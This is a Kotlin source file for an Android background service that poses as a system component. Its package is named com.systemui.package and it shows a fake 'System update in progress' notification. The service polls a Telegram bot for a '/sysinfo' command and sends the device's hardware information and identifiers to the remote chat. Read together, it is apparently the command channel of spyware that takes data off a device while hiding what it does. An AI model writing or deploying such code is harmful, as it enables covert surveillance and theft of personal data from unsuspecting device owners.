package com.systemui.package

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import kotlinx.coroutines.Dispatchers.IO

class TelegramBotService : Service() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var isRunning = false
    private var lastUpdateId = 0

    companion object {
        const val CHANNEL_ID = "TelegramBotChannel"
        const val NOTIFICATION_ID = 1
        const val POLL_INTERVAL_MS = 5000L
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isRunning) {
            isRunning = true
            startForeground(NOTIFICATION_ID, createNotification())
            serviceScope.launch {
                pollLoop()
            }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Telegram Bot Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Runs Telegram bot for device info polling"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Updating system")
            .setContentText("System update in progress...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private suspend fun pollLoop() = coroutineScope {
        while (isRunning) {
            try {
                val updates = TelegramApi.getUpdates(lastUpdateId)
                if (updates.ok) {
                    for (update in updates.result) {
                        update.update_id?.let { id ->
                            if (id > lastUpdateId) lastUpdateId = id
                        }
                        val message = update.message
                        if (message?.text?.trim() == "/sysinfo") {
                            @SuppressLint("HardwareIds")
                            val deviceInfoMap = getDeviceInfo(applicationContext)
                            val deviceInfo = DeviceInfo.fromMap(deviceInfoMap)
                            val responseText = deviceInfo.toFormattedString()

                            TelegramApi.sendMessage(message.chat.id, responseText)
                        }
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
            delay(POLL_INTERVAL_MS)
        }
    }
}
